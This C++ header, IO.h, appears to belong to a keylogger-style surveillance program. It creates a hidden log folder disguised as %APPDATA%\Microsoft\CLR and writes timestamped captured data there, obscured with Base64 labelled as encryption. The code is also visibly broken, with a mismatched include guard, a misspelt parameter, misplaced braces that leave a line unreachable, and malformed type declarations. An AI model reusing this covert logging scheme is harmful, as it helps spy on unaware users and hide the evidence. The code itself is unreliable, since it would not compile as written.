#ifndef IO_H
#define IO

#include "Helper.h"
#include "Base64.h"
#include "windows.h"
#include <string>
#include <cstdlib>

namespace IO
{
    std::string GetOurPath(const bool append_seperatator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperarator ? "\\" : "");
    }

    bool MkDir(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool CDir(std::string path)
    {
        for(char &c : path)
            if(c == '\\')
        {
            c = '\0';
            if (!MkDir(path))
            {
                return false;
            c = '\\';
            }
        }
    return true;
    }

    template <class T>
    std::string GenerateAppLog(const T &t)
    {
        std:string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name); //..AppData/Microsoft/CLR/ DateTIme.log
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t << std::endl;
            std::string:: data = Base64::Encrypt(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
           return "";
        }
    }
}
#endif // IO_H
